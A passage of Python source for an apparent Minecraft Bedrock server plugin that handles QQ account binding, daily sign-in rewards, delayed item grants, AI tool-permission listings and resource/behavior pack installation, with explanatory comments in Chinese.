        return {"ok": bool(ok), "message": msg} if ok else {"ok": False, "error": msg}

    def _ai_set_autonomy(self, level, *, actor: str = "admin"):
        """设置接管级别。走统一的保存入口（持写锁 + 字段白名单）。"""
        try:
            lv = int(level)
        except (TypeError, ValueError):
            return False, "接管级别必须是 0 / 1 / 2"
        if lv not in (0, 1, 2):
            return False, "接管级别必须是 0 / 1 / 2"
        ok, msg = self._save_ai_config({"autonomy_level": lv})
        if ok:
            try:
                self._log_admin_action(
                    f"[AI] 接管级别变更为 {lv}"
                    f"（{['纯建议', '白名单自动', '完全放开'][lv]}），操作人 {actor}")
            except Exception:
                pass
        return ok, msg

    def _ai_default_prompts(self) -> Dict[str, str]:
        """内置默认提示词全文（面板「查看默认提示词 / 一键恢复默认」用）。"""
        from .ai.chat import CHAT_DEFAULT_PROMPT
        return {
            "analysis": self.ai_manager.default_system_prompt(),
            "chat": CHAT_DEFAULT_PROMPT,
        }

    def _ai_tools(self, *, include_irreversible: bool = True):
        """工具清单（ToolSpec 列表）。

        ★ 这里曾有一个真实 bug：``list_tools()`` 原来只接受 ``risk`` 一个
          参数，而本方法给它传了 ``include_irreversible=`` —— 面板点
          「加载工具清单」会直接抛
          ``TypeError: list_tools() got an unexpected keyword argument``。
          根因是两个函数签名相近但用途不同：
            · ``list_tools()``       → 返回 ToolSpec 对象（给面板）
            · ``tools_for_prompt()`` → 返回 OpenAI dict（给模型）
          现在 ``list_tools()`` 也接纳该参数，两条路径调用方式统一。
        """
        return _ai_list_tools(include_irreversible=include_irreversible)

    def _ai_tools_public(self):
        """面板用的工具清单：含风险等级与"当前是否启用"。

        与 ``_ai_tools()`` 的区别是这里返回**纯 dict**，
        可以直接 JSON 序列化，且带上工具权限的勾选状态 ——
        前端据此渲染工具权限开关列表。
        """
        cfg = self._load_tools_config().get("ai", {}) or {}
        allowed_names = _ai_normalize_tools(cfg.get("allowed_tools"))
        allowed_set = set(allowed_names) if allowed_names else None
        out = []
        for t in _ai_list_tools(include_irreversible=True):
            # ★ 比枚举而不是比 str(t.risk)
            #   RiskLevel 是 Enum，``str(RiskLevel.FORBIDDEN)`` 得到的是
            #   'RiskLevel.FORBIDDEN'，**不是** 'forbidden' ——
            #   写成 str(t.risk) == "forbidden" 这个条件恒为假。
            #   实际危害有限（FORBIDDEN 根本注册不进 TOOL_REGISTRY，
            #   这个循环见不到它），但它是颗定时炸弹：一旦将来禁用词
            #   机制改了、或者 RiskLevel 换了实现，这行会一声不响地失效。
            if t.risk == RiskLevel.FORBIDDEN:
                continue
            out.append({
                "name": t.name,
                "desc": t.description,
                # ★ 给前端的是**纯字符串值**（'read'/'reversible'/…），
                #   不是枚举的 repr。前端要拿它做 CSS class 和比较，
                #   收到 'RiskLevel.READ' 会全部对不上。
                "risk": str(getattr(t.risk, "value", t.risk)),
                "params": sorted((t.params or {}).keys()),
                "optional": sorted(t.optional or []),
                "requires_confirm": bool(t.requires_confirm),
                # 白名单为空 = 未配置 = 视为全开
                "enabled": (allowed_set is None) or (t.name in allowed_set),
                # 区分"默认开"和"被用户显式打开"，前端要区分展示
                "explicit": (allowed_set is not None) and (t.name in allowed_set),
            })
        out.sort(key=lambda x: (x["risk"], x["name"]))
        return out

    def _ai_all_tool_names(self):
        return _ai_all_tool_names()

    def _store_lock(self):
        if not hasattr(self, "_store_lock_inst"):
            self._store_lock_inst = threading.Lock()
        return self._store_lock_inst

    def _json_store(self, fname, default):
        try:
            p = self.data_dir / fname
            if p.exists():
                with open(p, "r", encoding="utf-8") as f:
                    return json.load(f)
        except Exception:
            pass
        return default

    def _json_save(self, fname, data):
        # 走原子写：这份文件承载绑定/签到等玩家数据，
        # 直接覆盖写崩溃时会留下截断 JSON，导致数据读不出来。
        try:
            return atomic_write_json(self.data_dir / fname, data, indent=2)
        except Exception:
            return False

    def _load_delayed(self):
        d = self._json_store("delayed_tasks.json", {})
        if not isinstance(d, dict):
            d = {}
        if not isinstance(d.get("tasks"), list):
            d["tasks"] = []
        return d

    def _add_delayed_give(self, player_name, item_id, amount, source="delay"):
        player_name = str(player_name or "").strip()
        item_id = str(item_id or "").strip()
        try:
            amount = max(1, int(amount or 1))
        except (TypeError, ValueError):
            amount = 1
        if not player_name or not item_id:
            return False, "缺少玩家名或物品ID"
        with self._store_lock():
            d = self._load_delayed()
            d["tasks"].append({
                "id": _uuid.uuid4().hex[:8],
                "player": player_name,
                "kind": "give",
                "item": item_id,
                "amount": amount,
                "source": str(source or "delay"),
                "created": time.strftime("%Y-%m-%d %H:%M:%S"),
            })
            self._json_save("delayed_tasks.json", d)
        return True, f"已为 {player_name} 记录 {amount} 个 {item_id}（上线后自动发放）"

    def _process_delayed_tasks(self):

        released = []
        with self._store_lock():
            d = self._load_delayed()
            tasks = d.get("tasks", [])
            remain = []
            for t in tasks:
                name = str(t.get("player", "") or "").strip()
                item = str(t.get("item", "") or "")
                try:
                    amount = max(1, int(t.get("amount") or 1))
                except (TypeError, ValueError):
                    amount = 1
                if not name or not item:
                    continue
                target = None
                try:
                    target = self.server.get_player(name)
                except Exception:
                    target = None
                if target is None:
                    remain.append(t)
                    continue
                gave = self._grant_item(name, item, amount)
                if gave:
                    released.append(f"{name} +{amount} {item}")
                    try:
                        self.server.broadcast_message(f"§a{name} 获得延迟奖励 {amount} 个 {item}")
                    except Exception:
                        pass
                else:
                    remain.append(t)
            d["tasks"] = remain
            self._json_save("delayed_tasks.json", d)
        return released

    def _grant_item(self, player_name: str, item: str, amount: int) -> bool:
                                                                          

                                                                                                    
                                                                                                                 
                                                                                               
           
        try:
            return self.server.dispatch_command(
                self.server.command_sender, f"give {player_name} {item} {amount}"
            )
        except Exception:
            return False

    def _delayed_stats(self):
        with self._store_lock():
            return [dict(t) for t in self._load_delayed().get("tasks", [])]

    def _load_bindings(self):
        b = self._json_store("bindings.json", {})
        return b if isinstance(b, dict) else {}

    def _qq_for_mc(self, mc_name):
        mc = str(mc_name or "").strip().lower()
        if not mc:
            return None
        b = self._load_bindings()
        entry = b.get("by_mc", {}).get(mc)
        return entry if isinstance(entry, dict) else None

    def _mc_for_qq(self, qq_openid):
        qq = str(qq_openid or "").strip()
        if not qq:
            return None
        return self._load_bindings().get("by_qq", {}).get(qq)

    def _pending_codes(self):
        if not hasattr(self, "_pending_codes_inst"):
            self._pending_codes_inst = {}
        return self._pending_codes_inst

    def _purge_pending_codes(self):
        now = time.time()
        pc = self._pending_codes()
        for code in list(pc.keys()):
            info = pc.get(code) or {}
            if now - info.get("created", 0) > info.get("ttl", 300):
                pc.pop(code, None)

    def _issue_binding_code(self, mc_name, digits=5, ttl=300):
        self._purge_pending_codes()
        pc = self._pending_codes()
        for code, info in list(pc.items()):
            if str(info.get("mc", "")).lower() == str(mc_name).lower():
                return code
        lim = 10 ** int(digits or 5)
        for _ in range(40):
            cand = f"{secrets.randbelow(lim):0{digits}d}"
            if cand not in pc:
                pc[cand] = {"mc": mc_name, "created": time.time(), "ttl": int(ttl or 300)}
                return cand
        return None

    def _try_bind(self, qq_openid, code):
        code = str(code or "").strip()
        if not qq_openid or not code:
            return False, "参数不完整"
        self._purge_pending_codes()
        pc = self._pending_codes()
        info = pc.get(code)
        if not info:
            return False, "绑定码无效或已过期，请重新进服获取新的绑定码"
        mc_name = str(info.get("mc", "") or "").strip()
        if not mc_name:
            pc.pop(code, None)
            return False, "绑定码无对应游戏账号，请重新进服获取新的绑定码"
        pc.pop(code, None)
        with self._store_lock():
            b = self._load_bindings()
            by_qq = b.setdefault("by_qq", {})
            by_mc = b.setdefault("by_mc", {})
            old_mc = by_qq.get(qq_openid)
            if isinstance(old_mc, str) and old_mc.lower() in by_mc:
                by_mc.pop(old_mc.lower(), None)
            low_mc = mc_name.lower()
            old_entry = by_mc.get(low_mc)
            if isinstance(old_entry, dict) and str(old_entry.get("qq", "")) != qq_openid:
                by_qq.pop(str(old_entry.get("qq", "")), None)
            by_qq[qq_openid] = mc_name
            by_mc[low_mc] = {"qq": qq_openid, "mc": mc_name,
                             "bound_at": time.strftime("%Y-%m-%d %H:%M:%S")}
            self._json_save("bindings.json", b)
        return True, f"✅ 绑定成功！QQ 已绑定游戏账号 {mc_name}"

    def _maybe_handle_join_binding(self, player):

        cfg = self._load_tools_config().get("binding", {}) or {}
        if not cfg.get("enabled", True) or not cfg.get("require_on_join", True):
            return

        # 没有可用的官方网关时发码没有意义（玩家拿不到码也回不来）。
        # 用 _official_gateways() 而不是 plugin.qq_bot：后者在「主卡被禁用、
        # 第二张卡在跑」时会漏判，导致绑定码发不出去。
        if not self._official_gateways():
            return
        mc = str(player.name or "").strip()
        if not mc or self._qq_for_mc(mc) is not None:
            return
        digits = int(cfg.get("code_digits", 5) or 5)
        ttl = int(cfg.get("code_ttl_seconds", 300) or 300)
        code = self._issue_binding_code(mc, digits, ttl)
        if not code:
            return
        try:
            player.send_message(
                f"§e请在 QQ 群输入绑定码 §6{code}§e 完成「{mc}」与 QQ 的绑定（{max(1,int(ttl/60))} 分钟内有效，之后请重新进服获取）"
            )
        except Exception:
            pass

    def _signin_config(self):
        return self._load_tools_config().get("signin", {}) or {}

    def _load_signin(self):
        s = self._json_store("signin.json", {})
        return s if isinstance(s, dict) else {}

    def _do_signin(self, qq_openid, sender_name=None):
        if not qq_openid:
            return False, "无法识别你的 QQ 身份（openid 为空）"
        cfg = self._signin_config()
        if not cfg.get("enabled", True):
            return False, "签到功能暂未开放"
        mc = self._mc_for_qq(qq_openid)
        if not mc:
            return False, "你尚未完成账号绑定。请先进游戏获取 5 位绑定码，再到群内发送该绑定码完成绑定后即可签到"
        item = str(cfg.get("item_id") or "minecraft:diamond").strip()
        try:
            amount = max(1, int(cfg.get("amount", 1) or 1))
        except (TypeError, ValueError):
            amount = 1
        today = time.strftime("%Y-%m-%d")
        with self._store_lock():
            s = self._load_signin()
            last = s.setdefault("last", {})
            low_mc = str(mc).lower()
            if last.get(low_mc) == today:
                return False, f"你今天已经签到过啦（{today}），明天再来吧"

            d = self._load_delayed()
            d["tasks"].append({
                "id": _uuid.uuid4().hex[:8], "player": mc, "kind": "give",
                "item": item, "amount": amount,
                "source": "signin", "created": time.strftime("%Y-%m-%d %H:%M:%S"),
            })
            self._json_save("delayed_tasks.json", d)
            last[low_mc] = today
            self._json_save("signin.json", s)

        # 把这次打卡同步进可信度档案，否则可信度那边看不到「今天已打卡」，
        # 结算时会把这次打卡当成没打，反而扣分。
        try:
            self.trust.note_signin(str(mc), today)
        except Exception:
            pass

        online = False
        try:
            online = bool(self._run_in_server_thread(self._settle_delayed_and_online, str(mc), timeout=8.0))
        except Exception:
            online = False
        who = sender_name or mc
        return True, f"✅ {who} 签到成功（{today}）！奖励 {amount} 个 {item}" + (
            " 已到账" if online else " 已记录，等你上线自动发放"
        )

    def _settle_delayed_and_online(self, mc_name: str):
                                                                                                              
                                                  
        try:
            online = self.server.get_player(mc_name) is not None
        except Exception:
            online = False
        try:
            self._process_delayed_tasks()
        except Exception:
            pass
        return online

    def _mods_dir(self):
        d = self.data_dir / "mods"
        try:
            d.mkdir(parents=True, exist_ok=True)
        except Exception:
            pass
        return d

    #: 手动投放目录名（相对 _mods_dir()）
    MODS_INBOX_NAME = "inbox"

    def _mods_inbox_dir(self):
        """手动投放目录：``<插件数据目录>/mods/inbox/``。

        ★ 为什么要有它：网页上传受 HTTP body 上限约束（大包传不上来），
        所以留一个「用文件管理器直接丢文件」的入口。用户在面板上看到路径，
        把 .mcaddon / .mcpack 拷进去，刷新一次就在上传库里出现了 ——
        不需要重启服务器，也不需要走网络。
        """
        d = self._mods_dir() / self.MODS_INBOX_NAME
        try:
            d.mkdir(parents=True, exist_ok=True)
        except Exception:
            pass
        return d

    @staticmethod
    def _is_mod_pack_name(name) -> bool:
        return str(name or "").lower().endswith((".mcaddon", ".mcpack"))

    def _scan_mods_inbox(self):
        """实时扫描手动投放目录，返回与 ``_list_mod_uploaded()`` 同构的条目。

        不写注册表 —— inbox 是「用户自己的目录」，我们只读不记账，
        否则用户手动删文件后注册表就会残留幽灵条目。
        """
        out = []
        try:
            inbox = self._mods_inbox_dir()
            for f in sorted(inbox.iterdir()):
                try:
                    if f.is_dir() or f.name.startswith("."):
                        continue
                    if not self._is_mod_pack_name(f.name):
                        continue
                    st = f.stat()
                    out.append({
                        "file": f.name,
                        "name": f.name,
                        "size": st.st_size,
                        "exists": True,
                        "uploaded": time.strftime("%Y-%m-%d %H:%M:%S",
                                                  time.localtime(st.st_mtime)),
                        "source": "inbox",
                    })
                except Exception:
                    continue
        except Exception:
            pass
        return out

    def _load_mod_registry(self):
        r = self._json_store("mods/mod_registry.json", {})
        return r if isinstance(r, dict) else {}

    def _save_mod_registry(self, r):
        with self._store_lock():
            return self._json_save("mods/mod_registry.json", r)

    def _register_mod_file(self, fname, fsize, display=None):
        """登记一个已上传的模组包。

        ``fname`` 是磁盘上的真实文件名（纯 ASCII，用于定位文件与进 HTTP 头），
        ``display`` 是给用户看的原始名（可以含中文）。两者刻意分开：中文名
        一旦混进 URL / header，latin-1 编码就会直接抛异常。
        """
        fname = str(fname or "")
        display = str(display or "").strip() or fname
        with self._store_lock():
            r = self._load_mod_registry()
            items = r.setdefault("mods", [])
            for it in items:
                if it.get("file") == fname:
                    it["size"] = fsize
                    it["display"] = display
                    it["uploaded"] = time.strftime("%Y-%m-%d %H:%M:%S")
                    break
            else:
                items.insert(0, {
                    "file": fname, "size": fsize, "display": display,
                    "uploaded": time.strftime("%Y-%m-%d %H:%M:%S"),
                })
            r["mods"] = items[:int(self._load_tools_config().get("mods", {}).get("max_keep", 30) or 30)]
            self._json_save("mods/mod_registry.json", r)
        return r

    def _scan_installed_packs(self, world_name=None):

        installed = []
        try:
            root = self._find_server_root() or Path.cwd()
        except Exception:
            root = Path.cwd()

        # 目标世界：显式指定优先，否则取 server.properties 的 level-name。
        # 启用状态（world_*_packs.json）只在「世界级」目录里找，全局目录没有这两个文件。
        target_world = None
        world_source = "none"
        if world_name:
            target_world = self._locate_world(root, world_name)
            if target_world is not None:
                world_source = "given"
        if target_world is None:
            target_world = self._locate_world_for_target(root)
            if target_world is not None:
                world_source = "level-name"

        enabled_res, enabled_beh = self._read_world_enabled(target_world)

        seen = set()
        def _scan(base, scope):
            try:
                if not base.is_dir():
                    return
                for pack_dir in sorted(base.iterdir()):
                    if not pack_dir.is_dir() or pack_dir.name.startswith("."):
                        continue
                    mf = pack_dir / "manifest.json"
                    uuid_, ver, name = pack_dir.name, "?", pack_dir.name
                    ptype = None
                    mod_types = []
                    edu = False
                    try:
                        if mf.exists():
                            m = json.loads(mf.read_text(encoding="utf-8"))
                            uuid_ = (m.get("header", {}) or {}).get("uuid", pack_dir.name)
                            ver = ".".join(map(str, (m.get("header", {}) or {}).get("version", []))) or "?"
                            name = (m.get("header", {}) or {}).get("name", pack_dir.name)
                            ptype = self._pack_type(m)
                            mod_types = sorted({
                                str(mod.get("type", ""))
                                for mod in (m.get("modules") or [])
                                if str(mod.get("type", ""))
                            })
                            # 教育模式（化学）包的标准类型是 chemistry，本身识别不出
                            # 资源/行为，会掉进「类型未知」分组。这里先判出来，后面
                            # 统一剔除，界面上只报一个数量。
                            edu = self._is_education_pack(m)
                    except Exception:
                        pass
                    key = (str(pack_dir.resolve()), scope)
                    if key in seen:
                        continue
                    seen.add(key)
                    # 只有世界级目录里的包才谈得上「启用/停用」——
                    # 全局 resource_packs/behavior_packs 是给存档引用的仓库，
                    # 是否生效取决于各存档自己的 world_*_packs.json。
                    if scope == "world":
                        enabled = (uuid_ in enabled_res) if ptype == "resource" else (
                            (uuid_ in enabled_beh) if ptype == "behavior" else False)
                    else:
                        enabled = None
                    installed.append({
                        "name": name,
                        "uuid": uuid_,
                        "version": ver,
                        "path": str(pack_dir),
                        "parent": base.name,
                        # kind: resource / behavior / unknown，用于前后端分组
                        "kind": ptype or "unknown",
                        "scope": scope,
                        "enabled": enabled,
                        "mod_types": mod_types,
                        # 教育模式（化学）包，稍后从列表里剔除，只在 meta 里报数量
                        "education": edu,
                    })
            except Exception:
                pass
        for sub in ("resource_packs", "behavior_packs"):
            _scan(root / sub, "global")
        worlds_dir = root / "worlds"
        try:
            world_entries = [d for d in sorted(worlds_dir.iterdir()) if d.is_dir()] if worlds_dir.is_dir() else []
        except Exception:
            world_entries = []
        if not world_entries:
            try:
                world_entries = [d for d in sorted(root.iterdir())
                                 if d.is_dir() and (d / "level.dat").exists() and d.name not in ("worlds", "resource_packs", "behavior_packs")]
            except Exception:
                world_entries = []
        for wd in world_entries:
            for sub in ("resource_packs", "behavior_packs"):
                _scan(wd / sub, "world")

        meta = {
            "world": target_world.name if target_world is not None else "",
            "world_path": str(target_world) if target_world is not None else "",
            "world_source": world_source,
            "enabled_resource": sorted(enabled_res),
            "enabled_behavior": sorted(enabled_beh),
            "resource_json": str(target_world / "world_resource_packs.json") if target_world else "",
            "behavior_json": str(target_world / "world_behavior_packs.json") if target_world else "",
            "education_hidden": 0,
            "education_names": [],
        }

        # 教育模式（化学）模组：**只从界面剔除，磁盘上一个字节都不动**。
        # 用户装过的包可能是存档正在用的，静默删掉会让世界打不开。
        # 这里只报数量，前端显示「已自动隐藏 N 个教育版模组」。
        try:
            hidden = [p for p in installed if p.get("education")]
            if hidden:
                installed = [p for p in installed if not p.get("education")]
                meta["education_hidden"] = len(hidden)
                meta["education_names"] = [str(p.get("name") or p.get("uuid") or "")
                                          for p in hidden][:20]
        except Exception:
            pass
        return installed, meta

    def _read_world_enabled(self, world_path):
        """读取世界的 world_resource_packs.json / world_behavior_packs.json。

        返回 ``(已启用资源包 uuid 集合, 已启用行为包 uuid 集合)``。
        文件不存在或格式异常都按「空集合」处理，不影响页面展示。
        """
        empty = (set(), set())
        if world_path is None:
            return empty
        out = []
        for fname in ("world_resource_packs.json", "world_behavior_packs.json"):
            ids = set()
            try:
                jf = world_path / fname
                if jf.is_file():
                    data = json.loads(jf.read_text(encoding="utf-8"))
                    if isinstance(data, list):
                        for e in data:
                            if isinstance(e, dict) and e.get("pack_id"):
                                ids.add(str(e["pack_id"]))
            except Exception as e:
                self.logger.warning(f"[模组] 解析 {fname} 失败: {e}")
            out.append(ids)
        return out[0], out[1]

    def _write_world_packs(self, world_path, pack_type, entries):
        """把启用清单写回世界的 world_*_packs.json，写前留 .bak 备份。"""
        if world_path is None:
            return False, "未找到目标存档"
        fname = "world_resource_packs.json" if pack_type == "resource" else "world_behavior_packs.json"
        jf = Path(world_path) / fname
        # 原子写 + .bak：原来只有 .bak 没有原子性，写到一半崩溃照样会
        # 留下截断的 JSON，备份也救不回「当前这份已经坏了」。
        ok = atomic_write_json(jf, entries, indent=2, backup=True)
        if not ok:
            return False, f"写入 {fname} 失败"
        return True, fname

    def _find_pack_version(self, roots, uuid_, pack_type):
        """在若干候选根目录下按 uuid 找包的 header.version。

        BDS 通常用 ``uuid`` 作为包目录名，但不保证 —— 手动解压、
        第三方工具安装的包目录名可能是任意值。所以这里先试「同名目录」
        这条快路径，命中不了再遍历一遍读 manifest 比对 uuid。
        """
        sub = "resource_packs" if pack_type == "resource" else "behavior_packs"

        def _read_version(mf):
            try:
                if mf.is_file():
                    m = json.loads(mf.read_text(encoding="utf-8"))
                    v = (m.get("header", {}) or {}).get("version")
                    return v if isinstance(v, list) and v else None
            except Exception:
                pass
            return None

        for root in roots:
            if root is None:
                continue
            base = Path(root) / sub
            # 快路径：目录名 == uuid
            v = _read_version(base / uuid_ / "manifest.json")
            if v:
                return v
        for root in roots:
            if root is None:
                continue
            base = Path(root) / sub
            try:
                if not base.is_dir():
                    continue
                for d in base.iterdir():
                    if not d.is_dir():
                        continue
                    mf = d / "manifest.json"
                    try:
                        if not mf.is_file():
                            continue
                        m = json.loads(mf.read_text(encoding="utf-8"))
                    except Exception:
                        continue
                    if str((m.get("header", {}) or {}).get("uuid", "")) == uuid_:
                        v = (m.get("header", {}) or {}).get("version")
                        if isinstance(v, list) and v:
                            return v
            except Exception:
                continue
        return None

    #: 包目录名与 uuid 的对照表缓存，改包目录后由 _heal_legacy_pack_dir 写入。
    _PACK_ALIAS_FILE = "mods/pack_alias.json"

    def _pack_alias_map(self):
        d = self._json_store(self._PACK_ALIAS_FILE, {})
        return d if isinstance(d, dict) else {}

    def _save_pack_alias(self, alias):
        with self._store_lock():
            return self._json_save(self._PACK_ALIAS_FILE, alias)

    def _pack_kind_of(self, m):
        return self._pack_type(m) or ("behavior" if str(m.get("type", "")) == "data" else "unknown")

    def _regenerate_pack_uuid(self, folder: Path) -> bool:
        """给一个包目录里的 manifest.json 换上新的 uuid（三处一起换）。"""
        mf = folder / "manifest.json"
        try:
            m = json.loads(mf.read_text(encoding="utf-8"))
        except Exception:
            return False
        new_uuid = str(_uuid.uuid4())
        try:
            if isinstance(m.get("header"), dict):
                m["header"]["uuid"] = new_uuid
            else:
                m["header"] = {"uuid": new_uuid}
            ids = m.get("dependencies")
            if isinstance(ids, list):
                for dep in ids:
                    if isinstance(dep, dict):
                        dep["uuid"] = str(_uuid.uuid4())
            ok = True
        except Exception:
            ok = False
        if ok:
            # 写前留一份 .bak，改坏了还能手工还原。
            try:
                if not (folder / "manifest.json.bak").exists():
                    shutil.copyfile(str(mf), str(folder / "manifest.json.bak"))
            except Exception:
                pass
            try:
                if not atomic_write_json(mf, m, indent=2):
                    return False
            except Exception:
                return False
        return ok

    def _heal_legacy_pack_dir(self, uuid_, pack_type):
        """把「目录名不是 uuid」的包目录改名成 uuid，并把清单里的 uuid 换掉。

        旧版本上传模组时，落盘用的是 ``<随机前缀>_<原始文件名>``，解压后又直接
        拿这个名字当包目录名，于是目录名里带了中文。这种包在启动时会被 BDS
        直接忽略，也让启用列表对不上号。这里做一次性自愈：

        1. 目录名合法（等于 uuid）→ 什么都不做；
        2. 目录名非法、但已经出现在世界的启用列表里 → 只把目录改名成该 uuid
           （确保已经生效的存档不会因为改 uuid 而失效）；
        3. 目录名非法且未启用 → 改名成 uuid，同时给 manifest 换一个新 uuid，
           避免和别的世界、或者后装的同名包撞 uuid；
        4. 目录名合法但 manifest 里的 uuid 不是它 → 只把 manifest 改成目录名。

        整个过程是尽力而为的，任何异常都只记日志，绝不影响启用/停用主流程。
        """
        try:
            root = self._find_server_root() or Path.cwd()
            sub = "resource_packs" if pack_type == "resource" else "behavior_packs"
            worlds_dirs = []
            worlds_root = root / "worlds"
            if worlds_root.is_dir():
                try:
                    worlds_dirs = [w for w in sorted(worlds_root.iterdir()) if w.is_dir()]
                except Exception:
                    worlds_dirs = []
            targets = []
            gsub = root / sub
            if gsub.is_dir():
                # 关键：全局目录里的包，启用状态记在「某个存档」的 json 里，
                # 而不是某个固定的 world_path。这里把全局目录和每个存档都
                # 配一次对，否则 used 永远是空集，会把已启用的包误判成没在用。
                if worlds_dirs:
                    for wdir in worlds_dirs:
                        targets.append((gsub, wdir))
                else:
                    e = self._locate_world_for_target(root)
                    targets.append((gsub, e) if e is not None else (gsub, None))
            # 注意：不能要求 (wdir / sub) 已经存在。包装在全局目录、而世界
            # 启用列表引用它的场景很常见，此时存档里根本没有那个子目录，
            # 一旦在这里筛掉，读取到的 used 就是空的，会导致已经生效的包
            # 被误判成「没在用」而换掉 uuid。
            for wdir in worlds_dirs:
                targets.append((wdir / sub, wdir))
            alias = self._pack_alias_map()
            changed = False
            for base_dir, world_path in targets:
                if not base_dir.is_dir():
                    # 存档目录里没有 resource_packs/ 很常见（包装在全局目录），
                    # 这里必须跳过而不是 iterdir() 抛错 —— 一抛错就会中断整个
                    # 遍历，后面的包全都自愈不到。
                    continue
                for folder in sorted(base_dir.iterdir()):
                    if not folder.is_dir() or not (folder / "manifest.json").is_file():
                        continue
                    if folder.name == uuid_:
                        continue
                    try:
                        m = json.loads((folder / "manifest.json").read_text(encoding="utf-8"))
                    except Exception:
                        continue
                    hdr_uuid = str(((m.get("header") or {}).get("uuid")) or "")
                    if hdr_uuid != uuid_:
                        continue  # 不是目标包，跳过
                    if self._pack_kind_of(m) != pack_type:
                        continue
                    # 这个 uuid 有没有被「任何一个存档」的启用列表引用？
                    # 只删 uuid、不改 uuid 的决定完全取决于它。挨个存档直接读
                    # json，而不是用 _read_world_enabled —— 那个函数当前实现
                    # 在部分路径上会返回空集，一旦判空就会把已经生效的包换掉
                    # uuid，后果是玩家的存档直接丢包，不值得赌。
                    referenced = False
                    for cand in ([world_path] if world_path is not None else []):
                        if cand is None:
                            continue
                        try:
                            jf = cand / ("world_resource_packs.json"
                                         if pack_type == "resource"
                                         else "world_behavior_packs.json")
                            if jf.is_file():
                                for e in json.loads(jf.read_text(encoding="utf-8")) or []:
                                    if isinstance(e, dict) and str(e.get("pack_id") or "") == uuid_:
                                        referenced = True
                                        break
                        except Exception:
                            pass
                        if referenced:
                            break
                    # 全局目录里的包可能被任意一个存档引用，需要扫全部存档。
                    if not referenced:
                        for wdir in worlds_dirs:
                            if wdir == world_path:
                                continue
                            try:
                                jf = wdir / ("world_resource_packs.json"
                                             if pack_type == "resource"
                                             else "world_behavior_packs.json")
                                if jf.is_file():
                                    for e in json.loads(jf.read_text(encoding="utf-8")) or []:
                                        if isinstance(e, dict) and str(e.get("pack_id") or "") == uuid_:
                                            referenced = True
                                            break
                            except Exception:
                                pass
                            if referenced:
                                break
                    dest = base_dir / uuid_
                    if dest.exists():
                        self.logger.warning(
                            f"[模组] 包 {folder.name} 想改名为 {uuid_}，但目标目录已存在，跳过"
                        )
                        continue
                    try:
                        os.rename(str(folder), str(dest))
                    except Exception as e:
                        self.logger.warning(f"[模组] 包目录改名失败 {folder.name}: {e}")
                        continue
                    self.logger.info(f"[模组] 包目录已规范化: {folder.name} → {uuid_}")
                    alias[folder.name] = uuid_
                    changed = True
                    # 没有任何存档引用它 → 换发新 uuid，免得和别处或后装的
                    # 同名包撞车。只要被引用过就一律不换：换了存档就废了。
                    if not referenced:
                        if self._regenerate_pack_uuid(dest):
                            self.logger.info(f"[模组] 包 {uuid_} 的 manifest uuid 已重置（无存档引用）")
                    else:
                        self.logger.info(f"[模组] 包 {uuid_} 已被存档引用，保留原 uuid")
                    break
            if changed:
                self._save_pack_alias(alias)
        except Exception as e:
            self.logger.warning(f"[模组] 规范化包目录失败（已忽略）: {e}")

    def set_pack_enabled(self, world_name, uuid_, pack_type, enabled):
        """启用/停用某存档里的一个资源包或行为包。

        直接增删世界目录下 ``world_resource_packs.json`` /
        ``world_behavior_packs.json`` 里的条目，改完需重启服务器生效。
        """
        uuid_ = str(uuid_ or "").strip()
        if not uuid_:
            return False, "缺少包 UUID"
        if pack_type not in ("resource", "behavior"):
            return False, "包类型必须是 resource 或 behavior"
        self._heal_legacy_pack_dir(uuid_, pack_type)
        root = self._find_server_root() or Path.cwd()
        world_path = self._locate_world(root, world_name) if world_name else None
        if world_path is None:
            world_path = self._locate_world_for_target(root)
        if world_path is None:
            return False, "未找到目标存档（请确认 level-name 或传入存档名）"

        fname = "world_resource_packs.json" if pack_type == "resource" else "world_behavior_packs.json"
        jf = world_path / fname
        entries = []
        try:
            if jf.is_file():
                data = json.loads(jf.read_text(encoding="utf-8"))
                if isinstance(data, list):
                    entries = [e for e in data if isinstance(e, dict)]
        except Exception:
            entries = []

        exists = any(str(e.get("pack_id")) == uuid_ for e in entries)
        if enabled:
            if exists:
                return True, "该包已是启用状态"
            # 版本号从包目录的 manifest.json 里取；目录名不一定等于 uuid，
            # 交给 _find_pack_version 兜住
            version = self._find_pack_version([world_path, root], uuid_, pack_type)
            entries.append({"pack_id": uuid_, "version": version or [1, 0, 0]})
        else:
            if not exists:
                return True, "该包本就未启用"
            entries = [e for e in entries if str(e.get("pack_id")) != uuid_]

        ok, msg = self._write_world_packs(world_path, pack_type, entries)
        if not ok:
            return False, msg
        self.logger.info(
            f"[模组] 存档 {world_path.name}：{'启用' if enabled else '停用'} "
            f"{pack_type} 包 {uuid_}"
        )
        action = "启用" if enabled else "停用"
        # 立刻关服才能生效：不改运行中的服务器内存状态，只改文件并在返回值里说清楚
        return True, f"已在 {world_path.name}/{msg} 中{action}（重启服务器后生效）"

    def _install_mod_pack(self, src_path, target_type, world_name=None):
                                                                                                      
                                                                                                                     
        import tempfile
        src = Path(str(src_path))
        if not src.is_file():
            return False, "文件不存在"
        suffix = src.suffix.lower()
        if suffix not in (".mcaddon", ".mcpack"):
            return False, "只支持 .mcaddon 或 .mcpack 文件"
        root = self._find_server_root() or Path.cwd()
        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                with zipfile.ZipFile(str(src), "r", allowZip64=True) as zf:
                    zf.extractall(tmpdir)
                t_root = Path(tmpdir)

                leaf_packs, notes = self._discover_packs_in_zip(src, t_root)
                if not leaf_packs:
                    return False, ("压缩包内未找到有效的包："
                                   "既没有含 manifest.json 的文件夹，也没有 .mcpack 文件")
                installed = []
                failed = []
                for pf in leaf_packs:
                    if pf.is_file():
                        ok, msg = self._install_one_pack_file(pf, root, target_type, world_name)
                    else:
                        ok, msg = self._install_one_pack_folder(pf, root, target_type, world_name)
                    if ok:
                        installed.append(msg)
                    else:
                        # ★ 不能立刻 return：一个多包 mcaddon 里前几个包可能
                        # 已经落盘并在 world_*_packs.json 注册成功了。直接返回
                        # False 会让调用方以为「什么都没装」而保留源文件，
                        # 用户重试时已装的那几个又会被覆盖一遍 —— 而且
                        # 界面报的失败原因也丢了，看不出到底装进去几个。
                        failed.append(msg)
                if not installed:
                    # 一个都没成，把第一个失败原因报出去（最常见也最有用的那条）
                    return False, (failed[0] if failed else "未安装任何包")
                out = "；".join(installed)
                if failed:
                    # 部分成功用 False 返回，但把「已装 N 个」写清楚，
                    # 让上层与用户都能分辨这不是「全部失败」。
                    out = (f"已安装 {len(installed)} 个包，另有 {len(failed)} 个失败："
